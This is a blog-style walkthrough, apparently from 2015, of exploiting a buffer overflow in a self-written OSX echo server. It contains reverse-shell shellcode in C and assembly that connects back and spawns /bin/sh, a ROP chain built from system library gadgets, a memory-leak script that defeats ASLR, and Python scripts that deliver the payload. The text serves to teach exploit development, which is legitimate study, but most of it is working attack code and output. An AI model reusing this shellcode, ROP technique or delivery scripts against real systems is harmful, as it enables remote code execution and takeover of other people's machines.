+++
author = "cbrown"
date = "2015-09-18T19:55:54-07:00"
description = ""
tags = ["exploit", "rop", "aslr", "shell"]
title = "Walkthrough: Exploiting bugs to gain code execution on a modern operating system"

+++

Whenever I discover a bug or typo in code I've written, I like to ask myself what the worst-case effects of that typo might be. The most interesting question of course, is "If someone else found this before I did, could they have used it to gain arbitrary code execution?"

We've seen arbitrary *root* code execution gained from as little as a [single random bit being erroneously flipped](https://www.blackhat.com/docs/us-15/materials/us-15-Seaborn-Exploiting-The-DRAM-Rowhammer-Bug-To-Gain-Kernel-Privileges-wp.pdf), so in cases of buffer overflow or use-after-free errors, I tend to think the answer is virtually always yes.

But as an exercise, I occasionally feel a need to actually develop exploits, and if you're into C++, it's a great learning experience. Due to advances in security, there are an increasing number of hurdles, but I'm gonna walk you through the steps to exploit a simple overflow on a modern operating system.

**Prerequisites:** Basic knowledge of how a [call stack](https://en.wikipedia.org/wiki/Call_stack) works and basic understanding of common assembly instructions (push, pop, mov, add...). Being comfortable debugging executables is a plus.

My payload will be for OSX Yosemite, but the same techniques apply to other systems.

The vulnerability
-----------------

First, we'll need a vulnerable program. I'm gonna write up a quick one for this, but if you want to go hunting for these kinds of things in the wild, the easiest way is to grab a fuzzer such as [AFL](http://lcamtuf.coredump.cx/afl/) and start running it against open source projects.

Our vulnerable program: https://raw.githubusercontent.com/techbloglol/rce-exploit-walkthrough/master/exploitme.cpp

The important part is here:

```
class ConnectionHandler {
public:
    ConnectionHandler(int fd) : _fd(fd) {}
    ~ConnectionHandler() { close(_fd); }

    int run() {
        while (true) {
            ssize_t bytes = recv(_fd, _recvBuffer + _recvBytes, sizeof(_recvBuffer), 0);
            if (bytes <= 0) {
                break;
            }
            _recvBytes += bytes;
            void* newline = memchr(_recvBuffer, '\n', _recvBytes);
            if (newline) {
                send(_fd, _recvBuffer, (char*)newline - _recvBuffer + 1, 0);
                break;
            }
        }
        return 0;
    }

private:
    int _fd = 0;
    char _recvBuffer[512];
    size_t _recvBytes = 0;
};
```

See the bug? Good! Does it look like the kind of mistake you've made before? Maybe, maybe not... but let's pwn it. 

The plan of attack
------------------

This server echos the first line you send to it, then closes the connection. However, there's a run-of-the-mill buffer overflow.

So what can we overwrite with our data? The thing of primary interest here is `_recvBytes`. We can manipulate that to overwrite data at any address we choose relative to `_recvBuffer`.

Traditionally, we would stick our shell code into `_recvBuffer`, then write over a return address on the stack in order to execute it. But any modern system will make the stack and heap both non-executable. The trick here is to use [return-oriented programming](https://en.wikipedia.org/wiki/Return-oriented_programming).

Writing the shell code
----------------------

First, let's sketch out our shell code in C. The goal here is to be very minimal for a few reasons: We want to reduce the effort required to translate this to a payload, we want to minimize the chances of newlines occurring in the payload (which could be problematic), and we want to make sure our payload is small enough to fit onto the stack.

```
int s = socket(AF_INET, SOCK_STREAM, 0);
sockaddr_in address;
address.sin_family = AF_INET;
inet_pton(AF_INET, "127.0.0.1", &address.sin_addr.s_addr);
address.sin_port = htons(3000);
connect(s, (sockaddr*)&address, sizeof(sockaddr_in));
dup2(s, 2);
dup2(s, 1);
dup2(s, 0);
execve("/bin/sh", nullptr, nullptr);
```

When executed, this will connect to us on port 3000 with a shell. We can listen for it by simply using netcat: `nc -l 3000`. Then we can use it just like we would a terminal (almost).

The next step... assembly! This in my opinion is the fun part, but can also be tricky if you've never done anything in assembly before.

Here's an assembly translation for OSX:

```
.text
.globl _main

_main:
    mov $0x2000061, %rax          # socket
    xor %rdx, %rdx                # 0 (arg 3)
    mov $2, %rdi                  # AF_INET (arg 1)
    mov $1, %rsi                  # SOCK_STREAM (arg 2)
    syscall
    mov %eax, %edi                # s

    push %rdx
    mov $0x0100007fb80b0200, %rax # ip, port, AF_INET
    push %rax

    mov $0x2000062, %rax          # connect
    mov %rsp, %rsi                # address
    mov $16, %dl                  # 16
    syscall

    mov $3, %rsi
LC_dup2:
    mov $0x200005a, %rax          # dup2
    dec %esi
    syscall 
    jg LC_dup2

    mov $0x68732f2f6e69622f, %rax
    push %rax

    mov $0x200003b, %rax          # execve
    mov %rsp, %rdi                # "/bin//sh"
    syscall
```

Quick OSX primer: All system calls are made via the `syscall` instruction. You select the call you want with `rax`, then pass the parameters through `rdi`, `rsi`, and `rdx`. When the system call returns, `rax` holds the return value.

If you're on OSX and you give that a *.s* extension, you can compile it with clang just like you would a C++ file.

Building the return-oriented program
------------------------------------

Before continuing, you make sure you understand exactly how this works by reading up on the [return-oriented programming Wikipedia page](https://en.wikipedia.org/wiki/Return-oriented_programming) or elsewhere.

We basically need to find addresses in executable memory that we can jump to in sequence to effectively execute our above shell code. Each of these chainable addresses is referred to as a "gadget".

To find these gadgets, I'll be using [ROPgadget](https://github.com/JonathanSalwan/ROPgadget). If you run it and just pass our binary, you don't get much to work with:

```
MacBook-Pro:Desktop cbrown$ ROPgadget --binary /Users/cbrown/Desktop/exploitme             
Gadgets information
============================================================
0x0000000100000d09 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x0000000100000d37 : add byte ptr [rax], al ; add byte ptr [rax], al ; add rsp, 0x10 ; pop rbp ; ret
0x0000000100000d0b : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x0000000100000bd9 : add byte ptr [rax], al ; add rsp, 0x10 ; pop rbp ; ret
0x0000000100000ba7 : add byte ptr [rax], al ; pop rbp ; ret
0x0000000100000bdc : add esp, 0x10 ; pop rbp ; ret
0x0000000100000cc8 : add esp, 0x30 ; pop rbp ; ret
0x0000000100000ba3 : add esp, 0x330 ; pop rbp ; ret
0x0000000100000bdb : add rsp, 0x10 ; pop rbp ; ret
0x0000000100000cc7 : add rsp, 0x30 ; pop rbp ; ret
0x0000000100000ba2 : add rsp, 0x330 ; pop rbp ; ret
0x0000000100000d72 : jmp qword ptr [rip + 0x2c0]
0x0000000100000d07 : or byte ptr [rdx], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x0000000100000ba9 : pop rbp ; ret
0x0000000100000baa : ret
0x0000000100000c0a : ret 0xc931
0x0000000100000caa : ret 1
0x0000000100000d7a : ret 2
0x0000000100000ba5 : xor byte ptr [rbx], al ; add byte ptr [rax], al ; pop rbp ; ret
0x0000000100000cc5 : xor eax, eax ; add rsp, 0x30 ; pop rbp ; ret

Unique gadgets found: 20
```

Not much at all, as expected of such a minimal program. But... on OSX at least, you actually get a *lot* to work with, because not only do you have the vulnerable binary, but you also have a lot of shared libraries available:

```
MacBook-Pro:Desktop cbrown$ lldb ./exploitme 
(lldb) target create "./exploitme"
Current executable set to './exploitme' (x86_64).
(lldb) process launch -A false                                                                                                                                                                              Process 12502 launched: './exploitme' (x86_64)
listening...
Process 12502 stopped
* thread #1: tid = 0x1dccf, 0x00007fff940a7762 libsystem_kernel.dylib`__accept + 10, queue = 'com.apple.main-thread', stop reason = signal SIGSTOP
    frame #0: 0x00007fff940a7762 libsystem_kernel.dylib`__accept + 10
libsystem_kernel.dylib`__accept:
->  0x7fff940a7762 <+10>: jae    0x7fff940a776c            ; <+20>
    0x7fff940a7764 <+12>: movq   %rax, %rdi
    0x7fff940a7767 <+15>: jmp    0x7fff940a3c78            ; cerror
    0x7fff940a776c <+20>: retq   
(lldb) image list
[  0] 231E4E5C-E45C-3665-9308-183F8563A990 0x000000010a769000 ./exploitme 
[  1] B1B370A5-479F-3533-8AD7-97B687D4F989 0x00007fff6f928000 /usr/lib/dyld 
[  2] 1B9530FD-989B-3174-BB1C-BDC159501710 0x00007fff936e9000 /usr/lib/libc++.1.dylib 
[  3] 1866C519-C5F3-3D09-8C17-A8F703664521 0x00007fff8ac9f000 /usr/lib/libSystem.B.dylib 
[  4] 88A22A0F-87C6-3002-BFBA-AC0F2808B8B9 0x00007fff8b2b0000 /usr/lib/libc++abi.dylib 
[  5] 45E9A2E7-99C4-36B2-BEE3-0C4E11614AD1 0x00007fff8bb98000 /usr/lib/system/libcache.dylib 
[  6] E789748D-F9A7-3CFF-B317-90DF348B1E95 0x00007fff867f6000 /usr/lib/system/libcommonCrypto.dylib 
[  7] BF8FC133-EE10-3DA6-9B90-92039E28678F 0x00007fff8b00b000 /usr/lib/system/libcompiler_rt.dylib 
[  8] 0C68D3A6-ACDD-3EF3-991A-CC82C32AB836 0x00007fff949d9000 /usr/lib/system/libcopyfile.dylib 
[  9] 5779FFA0-4D9A-3AD4-B7F2-618227621DC8 0x00007fff90c65000 /usr/lib/system/libcorecrypto.dylib 
...
```

This actually has an added side-effect of making your ROP chains easily reusable! So we're gonna look through these libraries for our gadgets. 

If you're on OSX, make sure you extract the right architecture from any universal binary you intend to look in, and only search for gadgets in that:

```
lipo /usr/lib/system/libsystem_kernel.dylib -extract x86_64 -output ./libsystem_kernel.dylib
ROPgadget --binary ./libsystem_kernel.dylib
```

The first thing we should find is our system call gadget since it's the most critical. On OSX, the syscalls are found in */usr/lib/system/libsystem_kernel.dylib*. 

```
0x0000000000011404 : syscall ; ret
```

Also of particular interest are the especially versatile gadgets that just pop values off of the stack into registers. I recommend using the C++ pre-processor to define some basic building blocks with them like so:

```
#define LOAD_RDI(n) \
    KERNEL_GADGET(0x0000000000000b25), n, 0 // pop rdi ; pop rbp ; ret

#define LOAD_RDX(n) \
    KERNEL_GADGET(0x0000000000014762), n // pop rdx ; ret

#define SYSCALL(n) \
    LOAD_RAX(n), \
    KERNEL_GADGET(0x0000000000011404) // syscall ; ret
```

That way, the end result is something that's no less readable than your original assembly:

```
// socket(AF_INET, SOCK_STREAM, 0)
LOAD_RDI(2),
LOAD_RSI(1),
LOAD_RDX(0),
SYSCALL(0x2000061),

// connect(s, &address, 16)
GET_POINTER(0x0100007fb80b0200, 0, 0, 0, 0),
MOVE_RAX_TO_RDI(),
LOAD_RDX(16),
SYSCALL(0x2000062),

// dup2(s, 0)
LOAD_RSI(0),
SYSCALL(0x200005a),

// dup2(s, 1)
LOAD_RSI(1),
SYSCALL(0x200005a),

// dup2(s, 2)
LOAD_RSI(2),
SYSCALL(0x200005a),

// execve("/bin/sh", 0, 0)
GET_POINTER(0x0068732f6e69622f, 0, 0, 0, 0),
MOVE_RSI_TO_RDI(),
LOAD_RSI(0),
LOAD_RDX(0),
SYSCALL(0x200003b),
```

You can find my ROP code for OSX [here](https://github.com/techbloglol/rce-exploit-walkthrough/blob/master/osx-solution/rop.cpp). As you can see, if you plug in a library address, you can easily run and step through your chain in the debugger.

The pwning
----------

Now we're ready to complete the pwning. We can write to arbitrary memory, and we have a payload that'll give us a shell if we plug in a library address and write the payload to the stack.

There's just one more hurdle... [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization). On OSX, the libraries are randomly placed into memory on boot. They slide around, but they're always the same relative to eachother, so if we have the address of one, we have the address for them all. There are a few platform-specific ways to defeat ASLR, but in this case, we can actually get the program itself to tell us what we need to know.

By overwriting the offset, we can get the program to dump its memory for us:

```
#!/usr/bin/env python

import socket, struct, time

s = socket.create_connection(('127.0.0.1', 2000))
s.send('x' * 512) # fill _recvBuffer
s.send('y' * 4)   # fill _recvBytes alignment padding
s.send(struct.pack('<Q', 0x300)) # fill _recvBytes
time.sleep(1) # send the newline after _recvBytes has been overwritten
s.send('\n')
print(s.recv(4096).encode('hex'))
```

This happens to be stack memory, so if we were to dump more, we could actually get a lot of interesting information including environment variables. That alone can be really valuable since a lot of people carry the bad habit of putting sensitive information in environment variables, but what we want to get out of this is the offset of the libraries. Just look through the dump for a pointer to anything in one of those libraries.

The first one I see is a pointer to ``libdyld.dylib`start``. So using that, we can exploit a remote machine with a three-step process...

**Step 1** – Get a library address:

```
#!/usr/bin/env python

import socket, struct, time

s = socket.create_connection(('127.0.0.1', 2000))
s.send('x' * 512) # fill _recvBuffer
s.send('y' * 4)   # fill _recvBytes alignment padding
s.send('\x00\x03\x00\x00\x00\x00\x00\x00') # fill _recvBytes
time.sleep(1) # send the newline after _recvBytes has been overwritten
s.send('\n')
address = struct.unpack_from('<Q', s.recv(4096), 516 + 21 * 8)[0] - 0x35C9
print('/usr/lib/system/libdyld.dylib is at 0x{:x}'.format(address))
```

**Step 2** – Compile the ROP payload with the obtained address. If there's a newline in any of the addresses, you may need to make some adjustments to work around that. A newline before the last 512 bytes would cause the exploit to fail.

**Step 3** – Send the payload:

```
#!/usr/bin/env python

import socket, struct, time

rop_payload = '252ba693ff7f0000020000...' // put your ROP payload here

s = socket.create_connection(('127.0.0.1', 2000))
s.send('x' * 512) # fill _recvBuffer
s.send('y' * 4)   # fill _recvBytes alignment padding
s.send(struct.pack('<Q', 512+8*20)) # this should be the offset of a return address
time.sleep(1) # send the rest after _recvBytes has been overwritten
s.send(rop_payload.decode('hex') + '\n')
print('package deployed')
response = s.recv(4096)
if response:
    print(response.encode('hex'))

```

And there you have it! A fully developed remote code execution exploit on a modern OS.

I feel I would be amiss if I didn't at least mention one other common security measure we didn't have to talk about here: the [stack canary](https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries). This particular vulnerability made it easy to just jump right over the stack canary, but they do often come into play with these kinds of things.

You can find all of the files I used in [this GitHub repo](https://github.com/techbloglol/rce-exploit-walkthrough). Feel free to contribute solutions for other platforms!